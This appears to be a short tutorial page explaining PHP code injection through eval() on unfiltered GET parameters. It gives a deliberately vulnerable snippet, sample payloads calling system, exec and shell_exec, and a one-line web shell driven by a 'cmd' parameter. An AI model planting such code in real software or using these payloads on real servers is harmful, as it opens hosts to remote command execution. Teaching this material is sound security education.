# PHP

PHP stands for Hypertext Preprocessor. Being a scripting language like Python, PHP does not require compilation. It offers server-side scripting which allowed to creating dynamic web contents.&#x20;

Due to its characteristics of dynamic interaction with user's input, it can be vulnerable without proper user input filtering.

Below is the one of example that can be exploited. It is a simple code that receive user input and evaluate the input as PHP code.

### _Example 1. When PHP source code is vulnerable_

```php
<?php
$input=$_GET['search'];
eval($input);
?>
```

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption><p><a href="https://www.php.net/manual/en/function.eval.php">https://www.php.net/manual/en/function.eval.php</a></p></figcaption></figure>

```php
/?search=system("ls -la");
/?search=echo exec("ls -la");
/?search=echo shell_exec("ls -la");
```

This simple URL parameter could simply lead to entry point for attackers.&#x20;



### _Example 2. PHP code to obtain Web Shell_

```php
<?php
eval($_GET["cmd"]);
?>
```

```php
?cmd=system("ls"); 
?cmd=system("pwd");
```
